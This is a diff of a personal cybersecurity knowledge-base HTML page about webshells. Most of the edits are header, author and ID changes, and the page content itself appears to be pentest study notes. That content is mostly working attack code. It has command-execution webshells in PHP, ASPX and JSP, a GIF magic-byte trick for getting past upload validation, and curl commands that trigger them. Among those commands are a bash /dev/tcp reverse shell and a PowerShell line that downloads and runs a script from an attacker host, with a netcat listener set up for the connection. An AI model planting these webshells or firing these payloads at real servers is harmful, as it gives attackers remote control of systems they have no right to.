@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:57 -->
+<!-- 2026-07-30 Thu 22:15 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>webshell Webshell</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,17 +886,17 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org2799229">Default Kali Webshells</a></li>
-<li><a href="#orgee3141b">Payloads by Language</a>
+<li><a href="#org6ca6308">Default Kali Webshells</a></li>
+<li><a href="#org3a14c9b">Payloads by Language</a>
 <ul>
-<li><a href="#org73575ec">PHP</a></li>
-<li><a href="#orgdf5afe9">ASPX (IIS / .NET)</a></li>
-<li><a href="#orgd51631b">JSP (Tomcat / Java)</a></li>
-<li><a href="#org154578e">PHP with Magic Bytes (bypass image validation)</a></li>
+<li><a href="#org10160c7">PHP</a></li>
+<li><a href="#orgfb713a6">ASPX (IIS / .NET)</a></li>
+<li><a href="#orga55348e">JSP (Tomcat / Java)</a></li>
+<li><a href="#org21cf4f6">PHP with Magic Bytes (bypass image validation)</a></li>
 </ul>
 </li>
-<li><a href="#orgc60c28e">Triggering and Escalating</a></li>
-<li><a href="#org433ac9c">Tips</a></li>
+<li><a href="#orgfdb63db">Triggering and Escalating</a></li>
+<li><a href="#orgbae7332">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -898,15 +916,15 @@ Related: <a href="20260614T002700--file-upload-vulnerabilities__cybersecurity_pe
          <a href="20260314T005718--linux-privilege-escalation__concept_cybersecurity.html">Linux Privilege Escalation</a>
          <a href="20260314T005758--windows-privilege-escalation__concept_cybersecurity.html">Windows Privilege Escalation</a>
 </p>
-<div id="outline-container-org2799229" class="outline-2">
-<h2 id="org2799229">Default Kali Webshells</h2>
-<div class="outline-text-2" id="text-org2799229">
+<div id="outline-container-org6ca6308" class="outline-2">
+<h2 id="org6ca6308">Default Kali Webshells</h2>
+<div class="outline-text-2" id="text-org6ca6308">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8387646b470746f59b449aedf88206b2>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8a406e5337c4480691b61a447f94337a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8387646b470746f59b449aedf88206b2=document.querySelector('button[name=btn_8387646b470746f59b449aedf88206b2]');
-copyBtnbtn_8387646b470746f59b449aedf88206b2.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`ls /usr/share/webshells/\n# php/   asp/   aspx/   cfm/   jsp/   perl/\n\n# Most useful\n/usr/share/webshells/php/php-reverse-shell.php   # full reverse shell\n/usr/share/webshells/aspx/cmdasp.aspx            # IIS command shell\n/usr/share/webshells/php/simple-backdoor.php     # GET parameter shell\n`);copyBtnbtn_8387646b470746f59b449aedf88206b2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8387646b470746f59b449aedf88206b2.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8a406e5337c4480691b61a447f94337a=document.querySelector('button[name=btn_8a406e5337c4480691b61a447f94337a]');
+copyBtnbtn_8a406e5337c4480691b61a447f94337a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`ls /usr/share/webshells/\n# php/   asp/   aspx/   cfm/   jsp/   perl/\n\n# Most useful\n/usr/share/webshells/php/php-reverse-shell.php   # full reverse shell\n/usr/share/webshells/aspx/cmdasp.aspx            # IIS command shell\n/usr/share/webshells/php/simple-backdoor.php     # GET parameter shell\n`);copyBtnbtn_8a406e5337c4480691b61a447f94337a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8a406e5337c4480691b61a447f94337a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -921,43 +939,43 @@ let res = copyTextToClipboard(`ls /usr/share/webshells/\n# php/   asp/   aspx/  
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgee3141b" class="outline-2">
-<h2 id="orgee3141b">Payloads by Language</h2>
-<div class="outline-text-2" id="text-orgee3141b">
+<div id="outline-container-org3a14c9b" class="outline-2">
+<h2 id="org3a14c9b">Payloads by Language</h2>
+<div class="outline-text-2" id="text-org3a14c9b">
 </div>
-<div id="outline-container-org73575ec" class="outline-3">
-<h3 id="org73575ec">PHP</h3>
-<div class="outline-text-3" id="text-org73575ec">
+<div id="outline-container-org10160c7" class="outline-3">
+<h3 id="org10160c7">PHP</h3>
+<div class="outline-text-3" id="text-org10160c7">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_531c38f757874473a1ca24be580d6e83>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_a19dee74ffe54a26a844e0c40b98eb64>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_531c38f757874473a1ca24be580d6e83=document.querySelector('button[name=btn_531c38f757874473a1ca24be580d6e83]');
-copyBtnbtn_531c38f757874473a1ca24be580d6e83.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<?php system($_GET['cmd']); ?>\n<?php echo shell_exec($_REQUEST['cmd']); ?>\n\n# More evasive\n<?php $c=$_GET['c'];system($c); ?>\n\n# POST-based (harder to spot in logs)\n<?php system($_POST['cmd']); ?>\n`);copyBtnbtn_531c38f757874473a1ca24be580d6e83.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_531c38f757874473a1ca24be580d6e83.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a19dee74ffe54a26a844e0c40b98eb64=document.querySelector('button[name=btn_a19dee74ffe54a26a844e0c40b98eb64]');
+copyBtnbtn_a19dee74ffe54a26a844e0c40b98eb64.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<?php system($_GET['cmd']); ?>\n<?php echo shell_exec($_REQUEST['cmd']); ?>\n\n# More evasive\n<?php $c=$_GET['c'];system($c); ?>\n\n# POST-based (harder to spot in logs)\n<?php system($_POST['cmd']); ?>\n`);copyBtnbtn_a19dee74ffe54a26a844e0c40b98eb64.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a19dee74ffe54a26a844e0c40b98eb64.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-php">&lt;?php system($_GET['cmd']); ?&gt;
-&lt;?php echo shell_exec($_REQUEST['cmd']); ?&gt;
+<pre class="src src-php"><span style="color: #ff7f86;">&lt;?php</span> system($<span style="color: #4ae2f0;">_GET</span>[<span style="color: #2fafff;">'cmd'</span>]); <span style="color: #ff7f86;">?&gt;</span>
+<span style="color: #ff7f86;">&lt;?php</span> <span style="color: #79a8ff;">echo</span> shell_exec($<span style="color: #4ae2f0;">_REQUEST</span>[<span style="color: #2fafff;">'cmd'</span>]); <span style="color: #ff7f86;">?&gt;</span>
 
-# More evasive
-&lt;?php $c=$_GET['c'];system($c); ?&gt;
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">More evasive
+</span><span style="color: #ff7f86;">&lt;?php</span> $<span style="color: #4ae2f0;">c</span>=$<span style="color: #4ae2f0;">_GET</span>[<span style="color: #2fafff;">'c'</span>];system($<span style="color: #4ae2f0;">c</span>); <span style="color: #ff7f86;">?&gt;</span>
 
-# POST-based (harder to spot in logs)
-&lt;?php system($_POST['cmd']); ?&gt;
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">POST-based (harder to spot in logs)
+</span><span style="color: #ff7f86;">&lt;?php</span> system($<span style="color: #4ae2f0;">_POST</span>[<span style="color: #2fafff;">'cmd'</span>]); <span style="color: #ff7f86;">?&gt;</span>
 </pre>
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgdf5afe9" class="outline-3">
-<h3 id="orgdf5afe9">ASPX (IIS / .NET)</h3>
-<div class="outline-text-3" id="text-orgdf5afe9">
+<div id="outline-container-orgfb713a6" class="outline-3">
+<h3 id="orgfb713a6">ASPX (IIS / .NET)</h3>
+<div class="outline-text-3" id="text-orgfb713a6">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>ASPX</span><button class='copyBtn' name=btn_7325fb3f147b4a4a8362bdbbb9050188>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>ASPX</span><button class='copyBtn' name=btn_3723dc0d7bcf46bc8b19fe400b187d5a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7325fb3f147b4a4a8362bdbbb9050188=document.querySelector('button[name=btn_7325fb3f147b4a4a8362bdbbb9050188]');
-copyBtnbtn_7325fb3f147b4a4a8362bdbbb9050188.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<script runat=\"server\">\n    protected void Page_Load(object sender, EventArgs e) {\n        string cmd = Request.QueryString[\"cmd\"];\n        if (cmd != null) {\n            Process p = new Process();\n            p.StartInfo.FileName = \"cmd.exe\";\n            p.StartInfo.Arguments = \"/c \" + cmd;\n            p.StartInfo.UseShellExecute = false;\n            p.StartInfo.RedirectStandardOutput = true;\n            p.Start();\n            Response.Write(\"<pre>\" + p.StandardOutput.ReadToEnd() + \"</pre>\");\n        }\n    }\n</script>\n`);copyBtnbtn_7325fb3f147b4a4a8362bdbbb9050188.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7325fb3f147b4a4a8362bdbbb9050188.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3723dc0d7bcf46bc8b19fe400b187d5a=document.querySelector('button[name=btn_3723dc0d7bcf46bc8b19fe400b187d5a]');
+copyBtnbtn_3723dc0d7bcf46bc8b19fe400b187d5a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<script runat=\"server\">\n    protected void Page_Load(object sender, EventArgs e) {\n        string cmd = Request.QueryString[\"cmd\"];\n        if (cmd != null) {\n            Process p = new Process();\n            p.StartInfo.FileName = \"cmd.exe\";\n            p.StartInfo.Arguments = \"/c \" + cmd;\n            p.StartInfo.UseShellExecute = false;\n            p.StartInfo.RedirectStandardOutput = true;\n            p.Start();\n            Response.Write(\"<pre>\" + p.StandardOutput.ReadToEnd() + \"</pre>\");\n        }\n    }\n</script>\n`);copyBtnbtn_3723dc0d7bcf46bc8b19fe400b187d5a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3723dc0d7bcf46bc8b19fe400b187d5a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -981,15 +999,15 @@ let res = copyTextToClipboard(`<%@ Page Language=\"C#\" %>\n<%@ Import Namespace
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgd51631b" class="outline-3">
-<h3 id="orgd51631b">JSP (Tomcat / Java)</h3>
-<div class="outline-text-3" id="text-orgd51631b">
+<div id="outline-container-orga55348e" class="outline-3">
+<h3 id="orga55348e">JSP (Tomcat / Java)</h3>
+<div class="outline-text-3" id="text-orga55348e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JSP</span><button class='copyBtn' name=btn_ef5cbaa6f66d48bf90d2f8a5bc11be08>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JSP</span><button class='copyBtn' name=btn_65436f79c5ce45e6b273eda514730481>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ef5cbaa6f66d48bf90d2f8a5bc11be08=document.querySelector('button[name=btn_ef5cbaa6f66d48bf90d2f8a5bc11be08]');
-copyBtnbtn_ef5cbaa6f66d48bf90d2f8a5bc11be08.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\n\n# With output\n<%\n    String cmd = request.getParameter(\"cmd\");\n    Process p = Runtime.getRuntime().exec(cmd);\n    java.io.InputStream is = p.getInputStream();\n    int c;\n    while ((c = is.read()) != -1) out.print((char)c);\n%>\n`);copyBtnbtn_ef5cbaa6f66d48bf90d2f8a5bc11be08.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ef5cbaa6f66d48bf90d2f8a5bc11be08.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_65436f79c5ce45e6b273eda514730481=document.querySelector('button[name=btn_65436f79c5ce45e6b273eda514730481]');
+copyBtnbtn_65436f79c5ce45e6b273eda514730481.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\n\n# With output\n<%\n    String cmd = request.getParameter(\"cmd\");\n    Process p = Runtime.getRuntime().exec(cmd);\n    java.io.InputStream is = p.getInputStream();\n    int c;\n    while ((c = is.read()) != -1) out.print((char)c);\n%>\n`);copyBtnbtn_65436f79c5ce45e6b273eda514730481.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_65436f79c5ce45e6b273eda514730481.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1007,15 +1025,15 @@ let res = copyTextToClipboard(`<% Runtime.getRuntime().exec(request.getParameter
 </div></div>
 </div>
 </div>
-<div id="outline-container-org154578e" class="outline-3">
-<h3 id="org154578e">PHP with Magic Bytes (bypass image validation)</h3>
-<div class="outline-text-3" id="text-org154578e">
+<div id="outline-container-org21cf4f6" class="outline-3">
+<h3 id="org21cf4f6">PHP with Magic Bytes (bypass image validation)</h3>
+<div class="outline-text-3" id="text-org21cf4f6">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_16880ed56e14426c85549ea9f36eb38e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e88f1c2b4e624366ad43706cd8f7bd4e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_16880ed56e14426c85549ea9f36eb38e=document.querySelector('button[name=btn_16880ed56e14426c85549ea9f36eb38e]');
-copyBtnbtn_16880ed56e14426c85549ea9f36eb38e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Prepend GIF magic bytes — passes magic byte checks, PHP still executes\necho 'GIF89a' > shell.php\necho '<?php system($_GET[\"cmd\"]); ?>' >> shell.php\n`);copyBtnbtn_16880ed56e14426c85549ea9f36eb38e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_16880ed56e14426c85549ea9f36eb38e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e88f1c2b4e624366ad43706cd8f7bd4e=document.querySelector('button[name=btn_e88f1c2b4e624366ad43706cd8f7bd4e]');
+copyBtnbtn_e88f1c2b4e624366ad43706cd8f7bd4e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Prepend GIF magic bytes — passes magic byte checks, PHP still executes\necho 'GIF89a' > shell.php\necho '<?php system($_GET[\"cmd\"]); ?>' >> shell.php\n`);copyBtnbtn_e88f1c2b4e624366ad43706cd8f7bd4e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e88f1c2b4e624366ad43706cd8f7bd4e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1027,15 +1045,15 @@ let res = copyTextToClipboard(`# Prepend GIF magic bytes — passes magic byte c
 </div>
 </div>
 </div>
-<div id="outline-container-orgc60c28e" class="outline-2">
-<h2 id="orgc60c28e">Triggering and Escalating</h2>
-<div class="outline-text-2" id="text-orgc60c28e">
+<div id="outline-container-orgfdb63db" class="outline-2">
+<h2 id="orgfdb63db">Triggering and Escalating</h2>
+<div class="outline-text-2" id="text-orgfdb63db">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ad2806baaa8443279a79e1b2f1a971f8>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4f0a205067ad438e93fd581354ef8a81>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ad2806baaa8443279a79e1b2f1a971f8=document.querySelector('button[name=btn_ad2806baaa8443279a79e1b2f1a971f8]');
-copyBtnbtn_ad2806baaa8443279a79e1b2f1a971f8.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Confirm execution\ncurl \"http://$IP/uploads/shell.php?cmd=id\"\ncurl \"http://$IP/uploads/shell.php?cmd=whoami\"\n\n# Check connectivity back to attacker\ncurl \"http://$IP/uploads/shell.php?cmd=ping+-c+1+$ATTACKER\"\n\n# Reverse shell via webshell — Linux\ncurl \"http://$IP/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$ATTACKER/4444+0>%261'\"\n\n# Reverse shell via webshell — Windows PowerShell\ncurl \"http://$IP/uploads/shell.aspx?cmd=powershell+-c+IEX(New-Object+Net.WebClient).DownloadString('http://$ATTACKER/rev.ps1')\"\n`);copyBtnbtn_ad2806baaa8443279a79e1b2f1a971f8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ad2806baaa8443279a79e1b2f1a971f8.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_4f0a205067ad438e93fd581354ef8a81=document.querySelector('button[name=btn_4f0a205067ad438e93fd581354ef8a81]');
+copyBtnbtn_4f0a205067ad438e93fd581354ef8a81.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Confirm execution\ncurl \"http://$IP/uploads/shell.php?cmd=id\"\ncurl \"http://$IP/uploads/shell.php?cmd=whoami\"\n\n# Check connectivity back to attacker\ncurl \"http://$IP/uploads/shell.php?cmd=ping+-c+1+$ATTACKER\"\n\n# Reverse shell via webshell — Linux\ncurl \"http://$IP/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$ATTACKER/4444+0>%261'\"\n\n# Reverse shell via webshell — Windows PowerShell\ncurl \"http://$IP/uploads/shell.aspx?cmd=powershell+-c+IEX(New-Object+Net.WebClient).DownloadString('http://$ATTACKER/rev.ps1')\"\n`);copyBtnbtn_4f0a205067ad438e93fd581354ef8a81.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4f0a205067ad438e93fd581354ef8a81.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1058,11 +1076,11 @@ curl <span style="color: var(--clr-string); background-color: var(--bg-string);"
 Set listener before triggering:
 </p>
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1770d87ba7ac488287d7bcbb60cd04a5>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_504746d3f1d24060bf06decaeaed32d0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1770d87ba7ac488287d7bcbb60cd04a5=document.querySelector('button[name=btn_1770d87ba7ac488287d7bcbb60cd04a5]');
-copyBtnbtn_1770d87ba7ac488287d7bcbb60cd04a5.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`nc -lvnp 4444\n`);copyBtnbtn_1770d87ba7ac488287d7bcbb60cd04a5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1770d87ba7ac488287d7bcbb60cd04a5.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_504746d3f1d24060bf06decaeaed32d0=document.querySelector('button[name=btn_504746d3f1d24060bf06decaeaed32d0]');
+copyBtnbtn_504746d3f1d24060bf06decaeaed32d0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`nc -lvnp 4444\n`);copyBtnbtn_504746d3f1d24060bf06decaeaed32d0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_504746d3f1d24060bf06decaeaed32d0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1075,9 +1093,9 @@ See <a href="20260206T060726--reverse-shell__concept_cybersecurity.html">Reverse
 </p>
 </div>
 </div>
-<div id="outline-container-org433ac9c" class="outline-2">
-<h2 id="org433ac9c">Tips</h2>
-<div class="outline-text-2" id="text-org433ac9c">
+<div id="outline-container-orgbae7332" class="outline-2">
+<h2 id="orgbae7332">Tips</h2>
+<div class="outline-text-2" id="text-orgbae7332">
 <ul class="org-ul">
 <li>Always confirm <code>id</code> or <code>whoami</code> before attempting a reverse shell
 — confirms execution and tells you the service account context</li>
@@ -1097,6 +1115,20 @@ disabled — try <code>shell_exec()</code>, <code>exec()</code>, <code>passthru(
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1104,6 +1136,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
